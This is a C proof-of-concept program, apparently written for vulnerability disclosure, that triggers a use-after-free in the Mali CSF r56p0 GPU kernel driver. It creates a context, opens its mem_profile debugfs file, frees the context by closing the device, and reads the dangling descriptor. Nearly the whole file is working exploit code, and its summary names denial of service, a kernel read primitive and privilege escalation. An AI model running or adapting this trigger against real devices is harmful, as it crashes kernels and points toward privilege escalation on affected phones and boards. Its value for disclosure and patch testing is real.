// SPDX-License-Identifier: MIT
/*
 * Test script for Mali CSF r56p0 debugfs kctx UAF PoC (poc_debugfs_kctx_uaf.c)
 * Provides comprehensive debug output including debugfs enumeration,
 * file descriptor tracking, and detailed step-by-step explanations.
 *
 * This is an enhanced version of the original debugfs PoC with:
 * 1. Detailed debug logging for each operation
 * 2. Debugfs directory enumeration
 * 3. File descriptor tracking and analysis
 * 4. Detailed explanations of each ioctl call
 * 5. Privilege boundary demonstration
 * 6. Comprehensive error reporting and state tracking
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysmacros.h>
#include <time.h>
#include <dirent.h>
#include <ctype.h>

#include "../tools/mali_handshake.h"

#define DEBUG_OUTPUT_ENABLED

#define SYSCHK(x) ({ \
  typeof(x) __res = (x); \
  if (__res == (typeof(x))-1) { \
    fprintf(stderr, "\n[FATAL] System call failed: %s\n", strerror(errno)); \
    fprintf(stderr, "       File: %s, Line: %d\n", __FILE__, __LINE__); \
    exit(1); \
  } \
  __res; \
})

#define DEBUG_LOG(msg, ...) \
  do { \
    if (debug_enabled) { \
      time_t now = time(NULL); \
      struct tm *t = localtime(&now); \
      char timestamp[20]; \
      strftime(timestamp, sizeof(timestamp), "%H:%M:%S", t); \
      printf("[%s %s] ", timestamp, (geteuid() == 0 ? "ROOT" : "USER")); \
      printf(msg, ##__VA_ARGS__); \
      printf("\n"); \
    } \
  } while(0)

// Define IOCTL constants (mirrored from mali_kbase_ioctl.h)
#define KBASE_IOCTL_TYPE 0x80
#define __u8  uint8_t
#define __u16 uint16_t
#define __u32 uint32_t
#define __u64 uint64_t

struct kbase_ioctl_mem_profile_add {
    __u64 buffer; /* __u64 */
    __u32 len;    /* __u32 */
    __u32 padding; /* __u32 */
};

/* _IOW with __u64+2x__u32 = 16 bytes */
#define KBASE_IOCTL_MEM_PROFILE_ADD \
    _IOC(_IOC_WRITE, KBASE_IOCTL_TYPE, 27, sizeof(struct kbase_ioctl_mem_profile_add))

#define MAX_COOKIE_PATH 256
#define MIN(a, b) (((a) < (b)) ? (a) : (b))

// Function prototypes
static int find_mali_device(char *out, size_t outsz);
static int find_kctx_dir(char *out, size_t outsz, const char *devname);
static const char* get_debugfs_node_type(const char* path);

int main(int argc, char **argv) {
    int debug_enabled = 1;
    int ret = 0;
    
    printf("=== Mali CSF r56p0 Debugfs kctx UAF Test PoC ===\n");
    printf("User ID: %d, Effective UID: %d\n", getuid(), geteuid());
    printf("=== Debug Information ===\n");
    
    // Step 1: Check for root privileges
    if (geteuid() != 0) {
        printf("\n[WARNING] This test should be run as root for full debugfs access.\n");
        printf("  - /sys/kernel/debug/mali*/ctx files require root privileges.\n");
        printf("  - Test may still run but with limited functionality.\n");
    }
    
    // Step 2: Discover Mali device
    DEBUG_LOG("Searching for /dev/maliN device files");
    printf("\n[STEP 1] Device Discovery\n");
    printf("  - Purpose: Locate Mali character device files (/dev/mali0, /dev/mali1, etc.)\n");
    
    char dev_path[MAX_COOKIE_PATH / 2];
    if (find_mali_device(dev_path, sizeof(dev_path)) < 0) {
        printf("  -> FAILURE: No Mali device found.\n");
        printf("  -> Checked paths: /dev/mali0, /dev/mali, and /dev directory scan\n");
        return 1;
    }
    
    printf("  -> SUCCESS: Mali device found at: %s\n", dev_path);
    
    // Display device details
    struct stat dev_stat;
    if (stat(dev_path, &dev_stat) == 0) {
        printf("  -> Device details:\n");
        printf("     - File type: %s\n", (S_ISCHR(dev_stat.st_mode) ? "character device" : "other"));
        printf("     - Device number: %d:%d (major:minor)\n", major(dev_stat.st_rdev), minor(dev_stat.st_rdev));
        printf("     - Permissions: %o\n", dev_stat.st_mode & 0777);
    }
    
    // Step 3: Open Mali device
    DEBUG_LOG("Opening %s for read-write access", dev_path);
    printf("\n[STEP 2] Mali Device File Access\n");
    printf("  - Command: open(%s, O_RDWR)\n", dev_path);
    printf("  - Purpose: Establish communication with Mali driver to create kbase contexts\n");
    
    int mali_fd = SYSCHK(open(dev_path, O_RDWR));
    printf("  -> SUCCESS: Device file descriptor: %d\n", mali_fd);

    // Step 2b: complete the Kbase handshake (VERSION_CHECK + SET_FLAGS).
    // Without a kcontext, MEM_PROFILE_ADD fails with EPERM and no per-kctx
    // debugfs directory exists.
    DEBUG_LOG("Completing Kbase setup (VERSION_CHECK + SET_FLAGS)");
    printf("\n[STEP 2b] Kbase Handshake\n");
    printf("  - Purpose: Create the kcontext required by MEM_PROFILE_ADD\n");
    if (mali_kbase_setup(mali_fd) < 0) {
        printf("  -> FAILURE: handshake failed: %s\n", strerror(errno));
        close(mali_fd);
        return 1;
    }
    printf("  -> SUCCESS: kcontext created\n");
    
    // Step 4: Execute MEM_PROFILE_ADD ioctl (creates debugfs files)
    DEBUG_LOG("Creating mem_profile debugfs node via KBASE_IOCTL_MEM_PROFILE_ADD");
    printf("\n[STEP 3] MEM_PROFILE_ADD Ioctl (Debugfs Creation)\n");
    printf("  - Command: ioctl(%d, KBASE_IOCTL_MEM_PROFILE_ADD, &add_struct)\n", mali_fd);
    printf("  - Purpose: Create mem_profile debugfs node with i_private == kctx\n");
    printf("  - Ioctl number: 0x%02x, 27 (MEM_PROFILE_ADD)\n", KBASE_IOCTL_TYPE);
    printf("  - Data size: %zu bytes (__u64 + 2x__u32)\n", sizeof(struct kbase_ioctl_mem_profile_add));
    
    // Prepare MEM_PROFILE_ADD structure
    struct kbase_ioctl_mem_profile_add add;
    const char *marker = "DISCLOSURE-PoC-MEMPROFILE_DEBUGFS_TEST";
    
    memset(&add, 0, sizeof(add));
    add.buffer = (unsigned long long)(uintptr_t)marker;
    add.len = (unsigned int)strlen(marker);
    add.padding = 0;
    
    printf("  - Input structure:\n");
    printf("    * buffer pointer: %p (string: '%s')\n", (void*)marker, marker);
    printf("    * len: %u bytes\n", add.len);
    printf("    * padding: %u (reserved)\n", add.padding);
    
    int mem_profile_ret = ioctl(mali_fd, KBASE_IOCTL_MEM_PROFILE_ADD, &add);
    if (mem_profile_ret < 0) {
        printf("  -> FAILURE: MEM_PROFILE_ADD ioctl failed: %s\n", strerror(errno));
        close(mali_fd);
        return 1;
    }
    
    printf("  -> SUCCESS: Ioctl returned %d\n", mem_profile_ret);
    printf("  -> Note: mem_profile debugfs node created with i_private == kctx\n");
    printf("  -> Critical: kctx->mem_profile_data = attacker-supplied buffer pointer\n");
    
    // Step 5: Enumerate debugfs to find kctx directory
    DEBUG_LOG("Searching debugfs for kctx directory under /sys/kernel/debug");
    printf("\n[STEP 4] Debugfs Directory Enumeration\n");
    printf("  - Purpose: Locate the per-kctx debugfs directory\n");
    printf("  - Expected path: /sys/kernel/debug/mali*/ctx/<tgid>_<id>\n");
    
    // Extract device name from path
    char *device_name = strrchr(dev_path, '/') + 1;
    printf("  -> Device name for debugfs: '%s'\n", device_name);
    
    char kctxdir[MAX_COOKIE_PATH];
    if (find_kctx_dir(kctxdir, sizeof(kctxdir), device_name) < 0) {
        printf("  -> FAILURE: kctx debugfs directory not found.\n");
        printf("  -> Checked: /sys/kernel/debug/%s/ctx for <tgid>_* directories\n", device_name);
        close(mali_fd);
        return 1;
    }
    
    printf("  -> SUCCESS: Found kctx debugfs directory: %s\n", kctxdir);
    
    // List contents of kctx directory
    DEBUG_LOG("Enumerating debugfs files in kctx directory: %s", kctxdir);
    printf("\n[STEP 5] Debugfs File Analysis\n");
    
    DIR *kctx_dir = opendir(kctxdir);
    if (kctx_dir) {
        printf("  -> Contents of %s:\n", kctxdir);
        struct dirent *entry;
        while ((entry = readdir(kctx_dir)) != NULL) {
            if (entry->d_type == DT_REG || entry->d_type == DT_UNKNOWN) {
                char full_path[MAX_COOKIE_PATH];
                snprintf(full_path, sizeof(full_path), "%s/%s", kctxdir, entry->d_name);
                printf("    - %s (type: %s)\n", entry->d_name, get_debugfs_node_type(full_path));
            }
        }
        closedir(kctx_dir);
    }
    
    // Step 6: Open mem_profile debugfs file
    char mem_profile_path[MAX_COOKIE_PATH];
    snprintf(mem_profile_path, sizeof(mem_profile_path), "%s/mem_profile", kctxdir);
    
    DEBUG_LOG("Opening mem_profile debugfs file for read-only access");
    printf("\n[STEP 6] Debugfs File Access Setup\n");
    printf("  - Target file: %s\n", mem_profile_path);
    printf("  - Purpose: Create a file descriptor that will hold i_private == kctx\n");
    printf("  - Mode: O_RDONLY (to simulate privileged reader scenario)\n");
    printf("  - Critical: File open preserves i_private reference to kctx\n");
    
    printf("  -> Opening debugfs file...\n");
    int prof_fd = open(mem_profile_path, O_RDONLY);
    if (prof_fd < 0) {
        printf("  -> FAILURE: Cannot open debugfs file %s\n", mem_profile_path);
        printf("     This may be due to:\n");
        printf("     - Insufficient permissions (need root)\n");
        printf("     - Debugfs not mounted\n");
        printf("     - kctx directory doesn't exist or is empty\n");
        close(mali_fd);
        return 1;
    }
    
    printf("  -> SUCCESS: Debugfs file opened, file descriptor: %d\n", prof_fd);
    
    // Display file descriptor details
    struct stat prof_stat;
    if (fstat(prof_fd, &prof_stat) == 0) {
        printf("  -> File descriptor details:\n");
        printf("     - File size: %ld bytes\n", prof_stat.st_size);
        printf("     - Access mode: %o\n", prof_stat.st_mode & 0777);
        printf("     - Device number: %d:%d\n", major(prof_stat.st_rdev), minor(prof_stat.st_rdev));
    }
    
    // Step 7: Close Mali device (triggers kctx cleanup)
    DEBUG_LOG("Closing Mali device file - kctx will be cleaned up and vfree'd");
    printf("\n[STEP 7] Privilege Boundary Violation Setup\n");
    printf("  - Critical action: Close() the /dev/mali0 file descriptor\n");
    printf("  - Effect: kbase_context_debugfs_term() -> debugfs_remove_recursive()\n");
    printf("  - Critical: debugfs_remove_recursive() does NOT invalidate open fds!\n");
    printf("  - Result: File descriptor at %d still holds i_private == kctx\n", prof_fd);
    printf("  - Status: kctx is now vfree'd but fd reference persists\n");
    
    close(mali_fd);
    printf("  -> SUCCESS: Mali device closed, kctx cleanup initiated\n");
    printf("  -> WARNING: Debugfs file descriptor %d now holds dangling pointer!\n", prof_fd);
    printf("  -> CRITICAL: This is the privilege boundary cross-over scenario!\n");
    
    // Step 8: Read from dangling debugfs file (triggers UAF)
    DEBUG_LOG("Reading from dangling debugfs file - UAF will occur here");
    printf("\n[STEP 8] UAF Trigger - Reading from Dangling kctx Reference\n");
    printf("  - Command: read(%d, buffer, sizeof(buffer))\n", prof_fd);
    printf("  - Target: mem_profile debugfs node's seq_show/seq_write path\n");
    printf("  - Critical: This will dereference kctx->mem_profile_lock / kctx->mem_profile_data\n");
    printf("  - Expected result: UAF READ (slab-use-after-free) if KASAN enabled\n");
    
    char buf[512];
    ssize_t n;
    
    printf("  -> Attempting read from dangling file descriptor...\n");
    n = read(prof_fd, buf, sizeof(buf));
    
    if (n < 0) {
        printf("  -> Read() error: %s (may have raced - read may have completed)\n", strerror(errno));
        printf("     Note: Race conditions in kernel may cause read to fail gracefully\n");
    } else {
        printf("  -> SUCCESS: Read() returned %zd bytes\n", n);
        printf("  -> Data read: '%.*s'\n", (int)MIN(n, sizeof(buf)-1), buf);
    }
    
    // Step 9: Clean up
    DEBUG_LOG("Closing debugfs file descriptor");
    printf("\n[STEP 9] Cleanup\n");
    printf("  - Command: close(%d)\n", prof_fd);
    
    close(prof_fd);
    printf("  -> SUCCESS: Debugfs file descriptor closed\n");
    
    printf("\n=== Test Summary ===\n");
    printf("Test 2: Mali CSF r56p0 Debugfs kctx UAF PoC\n");
    printf("======================================\n");
    printf("Method: Deterministic single-process UAF via debugfs i_private dangling pointer\n");
    printf("Target: Per-kctx debugfs files (mem_profile, mem_jit_* etc.)\n");
    printf("Vulnerability: CWE-416 Use-After-Free (kernel heap)\n");
    printf("Attack Vector: Unprivileged userspace → MEM_PROFILE_ADD → privileged debugfs read\n");
    printf("\nCritical Analysis:\n");
    printf("  - Root Cause: debugfs_remove_recursive() does NOT invalidate already-open file handles\n");
    printf("  - Impact: Any per-kctx debugfs file with i_private == kctx has this bug\n");
    printf("  - Affected files: mem_profile, infinite_cache, force_same_va, mem_jit_* files, and CSF per-ctx files\n");
    printf("  - Privilege boundary: Unprivileged closer can corrupt privileged reader state\n");
    printf("\nExploitation Potential:\n");
    printf("  - Crash/DoS: Immediate mutex lock into freed vmalloc region\n");
    printf("  - Kernel read primitive: Attacker-controlled buffer redirected to privileged read\n");
    printf("  - Cross-privilege boundary escalation\n");
    printf("\n=== Environment Requirements ===\n");
    printf("  - Kernel: CONFIG_KASAN=y for detection\n");
    printf("  - Driver: Mali CSF r56p0 (AX504X08X-SW-99002-r56p0-18eac0)\n");
    printf("  - Debugfs: /sys/kernel/debug mounted with proper permissions\n");
    printf("  - Root access: Required for /sys/kernel/debug/mali*/ctx access\n");
    printf("  - Module: CONFIG_MALI_DEBUG=y for verbose debug output\n");
    printf("\n=== Expected Kernel Output (with KASAN) ===\n");
    printf("  Look for messages like:\n");
    printf("    BUG: KASAN: slab-use-after-free in kbasep_mem_profile_seq_show+0x?\n");
    printf("    Read of size 8 at addr ... (freed mm_struct field)\n");
    printf("    Call trace showing debugfs reader vs kbase_context_free\n");
    printf("\n=== Files Created for Reference ===\n");
    printf("  - This test_poc.c: Enhanced version with detailed debug output\n");
    printf("  - poc_debugfs_kctx_uaf.c: Original deterministic PoC (crash-only)\n");
    printf("  - memory_primitives_catalog.md: Complete catalog of memory management operations\n");
    
    return 0;
}

// Helper function to find Mali device files
static int find_mali_device(char *out, size_t outsz) {
    const char *cands[] = {"/dev/mali0", "/dev/mali", NULL};
    
    for (size_t i = 0; cands[i]; i++) {
        struct stat st;
        if (stat(cands[i], &st) == 0) {
            strncpy(out, cands[i], outsz - 1);
            out[outsz - 1] = '\0';
            return 0;
        }
    }
    
    // Fall back to scanning /dev directory
    DIR *d = opendir("/dev");
    if (!d) return -1;
    
    struct dirent *e;
    while ((e = readdir(d))) {
        if (strncmp(e->d_name, "mali", 4) == 0) {
            snprintf(out, outsz, "/dev/%s", e->d_name);
            closedir(d);
            return 0;
        }
    }
    closedir(d);
    return -1;
}

// Helper function to find kctx debugfs directory
static int find_kctx_dir(char *out, size_t outsz, const char *devname) {
    char path[MAX_COOKIE_PATH];
    DIR *d;
    struct dirent *e;
    
    snprintf(path, sizeof(path), "/sys/kernel/debug/%s/ctx", devname);
    
    if (stat(path, &(struct stat){.st_mode = DT_DIR}) != 0 && \
        stat(path, &(struct stat){.st_mode = DT_DIR}) != 0)
        return -1;
    
    d = opendir(path);
    if (!d) return -1;
    
    while ((e = readdir(d))) {
        if (e->d_type != DT_DIR && e->d_type != DT_UNKNOWN)
            continue;
            
        char prefix[MAX_COOKIE_PATH];
        snprintf(prefix, sizeof(prefix), "%d_", getpid());
        if (strncmp(e->d_name, prefix, strlen(prefix)) == 0) {
            snprintf(out, outsz, "%s/%s", path, e->d_name);
            closedir(d);
            return 0;
        }
    }
    closedir(d);
    return -1;
}

// Helper function to determine debugfs file type
static const char* get_debugfs_node_type(const char* path) {
    static char type_str[32];
    
    // Try to read the symlink target to determine file type
    char link_target[256];
    ssize_t len = readlink(path, link_target, sizeof(link_target) - 1);
    
    if (len < 0) {
        // Not a symlink, check if it's a regular file
        struct stat st;
        if (stat(path, &st) == 0) {
            if (S_ISREG(st.st_mode))
                strcpy(type_str, "regular file");
            else if (S_ISDIR(st.st_mode))
                strcpy(type_str, "directory");
            else
                strcpy(type_str, "other");
        } else {
            strcpy(type_str, "unknown");
        }
    } else {
        link_target[len] = '\0';
        if (strstr(link_target, "seq_file"))
            strcpy(type_str, "seq_file");
        else if (strstr(link_target, "mem_profile"))
            strcpy(type_str, "mem_profile (UAF target)");
        else
            strcpy(type_str, "symlink -> ");
            strncat(type_str, link_target, sizeof(type_str) - strlen(type_str) - 1);
    }
    
    return type_str;
}